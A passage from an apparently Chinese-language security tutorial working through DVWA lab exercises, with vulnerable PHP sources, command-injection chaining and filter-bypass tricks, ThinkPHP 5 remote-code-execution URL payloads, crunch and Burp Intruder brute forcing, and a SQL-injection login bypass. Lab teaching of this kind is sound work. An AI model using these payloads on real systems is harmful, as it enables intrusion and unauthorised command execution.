class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;Change&#x27;</span>] ) &amp;&amp; ( <span class="variable">$_POST</span>[<span class="string">&#x27;step&#x27;</span>] == <span class="string">&#x27;1&#x27;</span> ) ) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password_new&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass_new</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass_new</span> );</span><br><span class="line">    <span class="variable">$pass_new</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$pass_new</span> );</span><br><span class="line">    <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password_conf&#x27;</span>];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass_conf</span> );</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$pass_conf</span> );</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_conf</span> );</span><br><span class="line">    </span><br><span class="line">        <span class="variable">$resp</span> = <span class="title function_ invoke__">recaptcha_check_answer</span> (<span class="variable">$_DVWA</span>[<span class="string">&#x27;recaptcha_private_key&#x27;</span>],</span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&quot;recaptcha_challenge_field&quot;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&quot;recaptcha_response_field&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$resp</span>-&gt;is_valid) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// Check that the current password is correct</span></span><br><span class="line">        <span class="variable">$qry</span> = <span class="string">&quot;SELECT password FROM `users` WHERE user=&#x27;admin&#x27; AND password=&#x27;<span class="subst">$pass_curr</span>&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$qry</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> ((<span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>)  &amp;&amp; ( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysql_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ))&#123;</span><br><span class="line">                       <span class="variable">$insert</span>=<span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">                       <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$insert</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">                       <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;</span>;</span><br><span class="line">                       <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                       <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Either your current password is incorrect or the new passwords did not match. Please try again. &lt;/pre&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这种加上原密码再加上验证基本很难攻击。</p><h1 id="7-命令执行漏洞"><a href="#7-命令执行漏洞" class="headerlink" title="7. 命令执行漏洞"></a>7. 命令执行漏洞</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">windows或linux下：</span><br><span class="line">command1 &amp;&amp; command2先执行1再执行2</span><br><span class="line">command1 || command2先执行1，1为假再执行2</span><br><span class="line">command1 &amp; command2先执行2再执行1</span><br><span class="line">command1 | command2只执行2</span><br></pre></td></tr></table></figure><p>在过滤情况下的解决办法：</p><div class="table-container"><table><thead><tr><th>过滤关键字</th><th>解决方法</th><th>备注</th></tr></thead><tbody><tr><td>cat</td><td>ca\t、ca’’t、a=c;b=at;$a$b xxx、less xxx</td><td></td></tr><tr><td>空格</td><td>$IFS$9、&lt;、&lt;&gt;、%20(space)、%09(tab)</td><td>$IFS是bash中的内部域分隔符，可以代替空格。后面的$9数字是可以随意的，每个数字都有特殊含义，但是和前面的搭配都可以表示空格。</td></tr><tr><td>目录分隔符/</td><td>cd flag文件所在目录后在cat flag文件</td><td>ls后用反斜杠\查看目录里的文件，比如：ls \flag_is_here</td></tr><tr><td>&amp;、\</td><td></td><td>用；来分隔命令</td><td></td></tr><tr><td>；</td><td>%0a</td><td></td></tr><tr><td>flag</td><td>fla*</td><td>不用知道flag的具体名字</td></tr></tbody></table></div><h2 id="7-1-ThinkPHP-5漏洞"><a href="#7-1-ThinkPHP-5漏洞" class="headerlink" title="7.1 ThinkPHP 5漏洞"></a>7.1 ThinkPHP 5漏洞</h2><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls /</span><br><span class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</span><br></pre></td></tr></table></figure><h2 id="7-2-命令执行漏洞-低"><a href="#7-2-命令执行漏洞-低" class="headerlink" title="7.2 命令执行漏洞[低]"></a>7.2 命令执行漏洞[低]</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;submit&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="title function_ invoke__">php_uname</span>(<span class="string">&#x27;s&#x27;</span>), <span class="string">&#x27;Windows NT&#x27;</span>)) &#123; </span><br><span class="line">    </span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="variable">$cmd</span>.<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    </span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 3 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="variable">$cmd</span>.<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这段代码相当于cmd的ping功能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.008 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.022 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.019 ms</span><br><span class="line"></span><br><span class="line">--- 127.0.0.1 ping statistics ---</span><br><span class="line">3 packets transmitted, 3 received, 0% packet loss, time 2011ms</span><br><span class="line">rtt min/avg/max/mdev = 0.008/0.016/0.022/0.006 ms</span><br></pre></td></tr></table></figure><p>但如果利用合并命令，可以执行ping以外的其他功能，例如<strong>127.0.0.1&amp;&amp;pwd</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.008 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.017 ms</span><br><span class="line">64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.017 ms</span><br><span class="line"></span><br><span class="line">--- 127.0.0.1 ping statistics ---</span><br><span class="line">3 packets transmitted, 3 received, 0% packet loss, time 2019ms</span><br><span class="line">rtt min/avg/max/mdev = 0.008/0.014/0.017/0.004 ms</span><br><span class="line">/owaspbwa/dvwa-git/vulnerabilities/exec</span><br></pre></td></tr></table></figure><p>pwd 命令用作显示工作目录的路径名称 。</p><h2 id="7-2-命令执行漏洞-中"><a href="#7-2-命令执行漏洞-中" class="headerlink" title="7.2 命令执行漏洞[中]"></a>7.2 命令执行漏洞[中]</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;submit&#x27;</span>] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="title function_ invoke__">php_uname</span>(<span class="string">&#x27;s&#x27;</span>), <span class="string">&#x27;Windows NT&#x27;</span>)) &#123; </span><br><span class="line">    </span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="variable">$cmd</span>.<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    </span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 3 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="variable">$cmd</span>.<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>代码是将&amp;&amp;和；都替换成空，但我们可以用||，只要前面条件为假，就执行后面的命令。例如：<strong>hello || ls</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">help</span><br><span class="line">index.php</span><br><span class="line">source</span><br></pre></td></tr></table></figure><h2 id="7-3-命令执行漏洞-高"><a href="#7-3-命令执行漏洞-高" class="headerlink" title="7.3 命令执行漏洞[高]"></a>7.3 命令执行漏洞[高]</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;submit&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;ip&quot;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$target</span> );</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">    <span class="variable">$octet</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$target</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$octet</span>[<span class="number">0</span>])) &amp;&amp; (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$octet</span>[<span class="number">1</span>])) &amp;&amp; (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$octet</span>[<span class="number">2</span>])) &amp;&amp; (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$octet</span>[<span class="number">3</span>])) &amp;&amp; (<span class="title function_ invoke__">sizeof</span>(<span class="variable">$octet</span>) == <span class="number">4</span>)  ) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>].<span class="string">&#x27;.&#x27;</span>.<span class="variable">$octet</span>[<span class="number">1</span>].<span class="string">&#x27;.&#x27;</span>.<span class="variable">$octet</span>[<span class="number">2</span>].<span class="string">&#x27;.&#x27;</span>.<span class="variable">$octet</span>[<span class="number">3</span>];</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="title function_ invoke__">php_uname</span>(<span class="string">&#x27;s&#x27;</span>), <span class="string">&#x27;Windows NT&#x27;</span>)) &#123; </span><br><span class="line">    </span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="variable">$cmd</span>.<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    </span><br><span class="line">            <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 3 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>.<span class="variable">$cmd</span>.<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>对获取的ip值，先去下划线处理，然后根据’.’来分成数组，判断是否分成四份且每一份是数字的，然后还原回去，对ip值进行ping操作，否则判定输入ip值为非法ip格式。经过这样的处理，输入的只能是ip格式的参数，确保了执行输入参数的安全性。 </p><h1 id="8-暴力破解"><a href="#8-暴力破解" class="headerlink" title="8. 暴力破解"></a>8. 暴力破解</h1><p>暴力破解的关键是字典。用crunch生成字典：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crunch [min] [max] [characters] -t[patterns] -o[filename]</span><br><span class="line"></span><br><span class="line">crunch 6 8 abc123q -t a@@@@b -o test.txt</span><br><span class="line">创建一个至少6个字符，至多8个字符，由abc123q生成的由a开头由b结尾的test.txt字典。</span><br></pre></td></tr></table></figure><h2 id="8-1-网页密码暴力破解-低"><a href="#8-1-网页密码暴力破解-低" class="headerlink" title="8.1 网页密码暴力破解[低]"></a>8.1 网页密码暴力破解[低]</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">burp suite</span><br></pre></td></tr></table></figure><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[<span class="string">&#x27;Login&#x27;</span>] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$qry</span> = <span class="string">&quot;SELECT * FROM `users` WHERE user=&#x27;<span class="subst">$user</span>&#x27; AND password=&#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>( <span class="variable">$qry</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysql_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$i</span>=<span class="number">0</span>; <span class="comment">// Bug fix.</span></span><br><span class="line">        <span class="variable">$avatar</span> = <span class="title function_ invoke__">mysql_result</span>( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">&quot;avatar&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login Successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &quot;</span> . <span class="variable">$user</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;&#x27;</span> . <span class="variable">$avatar</span> . <span class="string">&#x27;&quot; /&gt;&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>代码很简单，用户输入账号密码后，将用户的密码进行MD5加密，从数据库中找相应的账号密码与之对比，相与为1的话输出用户名和头像。</p><p>我们随便输入账号密码，用burpsuite拦截数据包。在burpsuite中右键将包发送至intruder模块。进入intruder的positions模块，选择需要爆破的变量，需要爆破的变量前后面都加$，选择攻击类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Sniper – 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</span><br><span class="line"></span><br><span class="line">Battering ram – 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中</span><br><span class="line"></span><br><span class="line">Pitchfork – 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量</span><br><span class="line"></span><br><span class="line">Cluster bomb – 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</span><br></pre></td></tr></table></figure><p>选择cluster bomb，再在payloads模块的payload options添加字典。爆破出结果。</p><p>第二种方法是SQL注入，从源码看到没有对username和password进行过滤。当试到6个字段的时候，它说成功进入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2,3,4,5,6 -- d</span><br><span class="line"></span><br><span class="line">Welcome to the password protected area &#x27; union select 1,2,3,4,5,6 -- d</span><br></pre></td></tr></table></figure><h2 id="8-2-网页密码暴力破解-中"><a href="#8-2-网页密码暴力破解-中" class="headerlink" title="8.2 网页密码暴力破解[中]"></a>8.2 网页密码暴力破解[中]</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$user</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$qry</span> = <span class="string">&quot;SELECT * FROM `users` WHERE user=&#x27;<span class="subst">$user</span>&#x27; AND password=&#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>( <span class="variable">$qry</span> ) <span 